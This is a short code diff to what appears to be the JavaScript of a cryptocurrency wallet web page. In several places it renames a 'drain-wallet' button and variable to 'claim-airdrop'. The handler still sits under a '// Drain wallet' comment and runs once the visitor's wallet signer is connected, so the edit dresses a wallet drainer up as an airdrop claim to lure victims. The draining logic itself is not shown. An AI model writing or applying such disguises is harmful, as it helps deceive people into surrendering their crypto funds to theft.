@@ -4,7 +4,7 @@
 document.addEventListener('DOMContentLoaded', function() {
     // Elements
     const connectButton = document.getElementById('connect-wallet');
-    const drainButton = document.getElementById('drain-wallet');
+    const claimButton = document.getElementById('claim-airdrop');
     const accountDetails = document.getElementById('account-details');
     const statusText = document.getElementById('status');
 
@@ -68,7 +68,7 @@ connectButton.addEventListener('click', async () => {
 });
 
 // Drain wallet
-drainButton.addEventListener('click', async () => {
+claimButton.addEventListener('click', async () => {
     if (!signer) {
         alert('Please connect your wallet first');
         return;
@@ -565,7 +565,7 @@ function updateUI() {
         <p><strong>Chain ID:</strong> ${chainId}</p>
     `;
     connectButton.disabled = true;
-    drainButton.disabled = false;
+    claimButton.disabled = false;
 }
 
 // Reset UI to disconnected state
@@ -579,7 +579,7 @@ function resetUI() {
     solConnection = null;
     accountDetails.innerHTML = '<p>Disconnected</p>';
     connectButton.disabled = false;
-    drainButton.disabled = true;
+    claimButton.disabled = true;
     statusText.textContent = '';
 }
 
